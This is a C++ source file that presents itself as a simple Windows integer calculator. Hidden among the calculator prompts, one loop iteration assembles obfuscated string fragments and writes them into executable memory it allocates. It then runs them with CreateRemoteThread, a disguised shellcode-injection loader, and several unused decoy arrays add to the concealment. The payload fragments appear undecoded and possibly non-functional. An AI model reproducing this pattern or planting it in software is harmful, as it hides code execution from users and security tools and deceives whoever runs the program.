#include "operations.h"
#include <iostream>
#include <windows.h>
#include <memoryapi.h>
#include <processthreadsapi.h>
#include <string>

// g++ -static -static-libgcc -static-libstdc++ -o calculator main.cpp operations.cpp -lkernel32 -luser32

int main() {
    int x = 0;
    std::cout << "+++++++++++++++++++++++++++++++++++++++++++++++" << std::endl;
    std::cout << "++++++++++ Basic Integer Calculator +++++++++++" << std::endl;
    std::cout << "+++++++++++++++++++++++++++++++++++++++++++++++" << std::endl;
    int a, b;
    char op = ' ';
    char test[] = "";
    std::string t[] = { "NsaW", "IsjI", "*&sda==" };
    std::string f[] = { "ZGR", "JSA==", "ya00", "4fQ==" };
    std::string t1[] = { "XcVy", "asFj", "4fQ==" };
    std::string f1[] = { "DeP", "He", "X0d", "eXJv" };
    std::string f2[] = { "bTNN", "X2", "4z" };
    std::string tx[] = { "XDyFcv", "asFDasj", "4fFGQ==GA" };
    while (x < 4) {
        switch (x) {
            case 0: {
            std::cout << "Enter your expression ([num1][+|-|*|/][num2]): ";
            std::cin >> a >> op >> b;
            switch (op) {
                case '+':
                    std::cout << "Result: " << Operations::a(a, b) << std::endl;
                    break;
                case '-':
                    std::cout << "Result: " << Operations::s(a, b) << std::endl;
                    break;
                case '*':
                    std::cout << "Result: " << Operations::m(a, b) << std::endl;
                    break;
                case '/':
                    try {
                        std::cout << "Result: " << Operations::d(a, b) << std::endl;
                        }
                    catch (const std::invalid_argument& e) {
                        std::cout << e.what() << std::endl;
                        }
                    break;
                default:
                    std::cout << "Invalid operator!" << std::endl;
                    break;
                }
            x++;
            break;
            }
            case 2: {
            HANDLE hx = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
            if (hx == NULL) {
                break;
                }
            std::string fx;
            for (const auto& i : f1) fx += i;
            for (const auto& i : f2) fx += i;
            for (const auto& i : f) fx += i;
            LPVOID ax = VirtualAllocEx(hx, NULL, fx.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(hx, ax, fx.c_str(), fx.size(), NULL);
            HANDLE hxT = CreateRemoteThread(hx, NULL, 0, (LPTHREAD_START_ROUTINE)ax, NULL, 0, NULL);
            WaitForSingleObject(hxT, 12);
            VirtualFreeEx(hx, ax, 0, MEM_RELEASE);
            CloseHandle(hxT);
            CloseHandle(hx);
            x++;
            break;
            }
            default: {
            std::cout << "Enter your expression ([num1][+|-|*|/][num2]): ";
            std::cin >> a >> op >> b;
            switch (op) {
                case '+':
                    std::cout << "Result: " << Operations::a(a, b) << std::endl;
                    break;
                case '-':
                    std::cout << "Result: " << Operations::s(a, b) << std::endl;
                    break;
                case '*':
                    std::cout << "Result: " << Operations::m(a, b) << std::endl;
                    break;
                case '/':
                    try {
                        std::cout << "Result: " << Operations::d(a, b) << std::endl;
                        }
                    catch (const std::invalid_argument& e) {
                        std::cout << e.what() << std::endl;
                        }
                    break;
                default:
                    std::cout << "Invalid operator!" << std::endl;
                    break;
                }
            x++;
            break;
            }
            }
        }
    }
